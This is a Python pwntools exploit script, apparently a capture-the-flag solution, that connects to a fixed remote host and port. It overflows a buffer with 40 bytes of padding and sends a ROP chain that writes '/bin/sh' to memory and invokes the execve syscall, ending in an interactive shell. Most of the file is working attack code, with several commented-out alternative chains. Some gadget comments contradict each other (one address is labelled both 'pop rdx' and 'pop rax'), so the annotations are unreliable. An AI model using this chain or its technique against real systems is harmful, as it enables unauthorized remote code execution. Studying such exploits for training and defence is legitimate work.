
from pwn import *

# Author : yuan
# https://30cm.ml

host = "140.115.59.7"
port = 11003

yuan = remote(host,port)

payload = "a"*40

payload += p64(0x000000000044d0f4) #pop rdx ; ret
payload += '/bin/sh\00'
payload += p64(0x00000000004017a7) #pop rdi ; ret
payload += p64(0x00000000006c0100)
payload += p64(0x0000000000467991) #mov qword ptr [rdi - 0xa], rdx ; mov dword ptr [rdi - 4], ecx ; ret
# ------
#payload += p64(0x0000000000437045) #pop rdx ; ret
#payload += p64(0x00000000006c0100)
#payload += p64(0x0000000000401693) #pop rdi ; ret
#payload += p64(0x00000000006c008a)
#payload += p64(0x000000000042a377) #mov qword ptr [rdi - 0xa], rdx ; mov dword ptr [rdi - 4], ecx ; ret

#payload += p64(0x0000000000491330) #xor ebx, ebx ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
#payload += p64(0x0000000000408482) # pop rbx ; ret
#payload += p64(0x00000000006c0023)
#payload += p64(0x00000000006c0023) * 2
#payload += p64(0x0000000000408f0d)  #: adc ebx, dword ptr [rbx + 0x5d] ; pop r12 ; ret
#payload += p64(0x00000000006c0023)

#payload += p64(0x00000000004017a7) #rsi
#payload += p64(0x00000000006c0108)
#payload += p64(0x000000000041bbdf) #xor rax, rax ; ret
#payload += p64(0x0000000000467991) # mov qword ptr [rsi], rax ; ret


#payload += p64(0x0000000000483f33) #xor edx, edx ; or cl, cl ; cmove rax, rdx ; ret
#payload += p64(0x0000000000401700) #: xor eax, eax ; ret
#payload += p64(0x000000000041eeef) #xchg eax, ecx ; sub eax, edx ; ret   $ecx = 0

#payload += p64(0x000000000043316f) ##mov eax, 0x10 ; pop rbx ; ret
#payload += p64(0x0000000000432bd4) * 6 #sub eax, 1 ; ret                 $eax = 11
#payload += p64(0x0000000000401700) #: xor eax, eax ; ret
#payload += p64(0x0000000000483f33) #xor edx, edx ; or cl, cl ; cmove rax, rdx ; ret
#payload += p64(0x0000000000401066)

payload += p64(0x000000000044d0f4) # : pop rax ; ret
payload += p64(0x000000000000003b)
payload += p64(0x0000000000401693) # : pop rdi ; ret
payload += p64(0x00000000006c0100)
payload += p64(0x00000000004017a7) #pop rsi
payload += p64(0x00000000006c0107)
payload += p64(0x0000000000437045) #rdx
payload += p64(0x00000000006c0107)
#payload += p64(0x0000000000401066)
payload += p64(0x000000000045b365)
#payload += "aaaaAAAA"
#payload += "00000000006c0100"
#payload += "\x00\x01\x6c\x00\x00\x00\x00\x00"

yuan.sendline(payload)
yuan.interactive()
